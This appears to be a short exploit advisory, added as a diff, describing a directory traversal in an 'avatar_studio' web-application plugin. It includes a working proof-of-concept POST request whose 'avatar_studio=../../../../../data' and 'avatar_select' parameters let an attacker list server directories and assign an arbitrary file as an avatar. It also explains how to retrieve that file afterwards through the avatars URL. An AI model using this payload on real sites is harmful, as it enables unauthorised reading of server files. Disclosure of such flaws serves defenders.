@@ -1,0 +1,19 @@
+# Tested on: Spanish version
+
+By modifying "avatar_studio" parameter at POST data at avatar_studio.php you can retrieve all images at that dir.
+Also using "avatar_select" you can add yourself a file as avatar which may not be .jpg
+
+Proof of concept:
+
+POST /infusions/avatar_studio/avatar_studio.php HTTP/1.1
+...
+Headers
+...
+Content-Length: XX
+avatar_studio=../../../../../data&avatar_select=data.txt&avatar_save=Salvar+Avatar <-- (Spanish: 'Save avatar')
+
+If you are trying to access to a non-existent directory it would return a php error.
+Else if your file does exist it will load as normal.
+
+When you have modified your avatar you can access to it using your "user id" as:
+http://www.xxxxxxxxxxxxx.com/images/avatars/avatar[YOURUSERID].EXTENSION
